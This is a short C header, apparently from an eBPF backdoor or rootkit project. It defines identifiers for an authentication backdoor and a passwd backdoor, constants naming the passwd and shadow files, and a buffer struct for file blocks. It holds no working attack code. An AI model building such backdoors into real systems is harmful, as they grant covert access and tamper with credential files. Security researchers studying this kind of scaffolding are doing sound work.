#pragma once
/* Shared definitions between eBPF programs and user space programs */

// Backdoor type identifiers
#define AUTH_BACKDOOR 1
#define PASSWD_BACKDOOR 2

// Files identifiers
#define PASSWD_FILE 0
#define SHADOW_FILE 1

#define filename_len_max 128
#define file_block_len 8192


/* Structures */
struct file_block {
    char buff[file_block_len];
    int buff_len;
};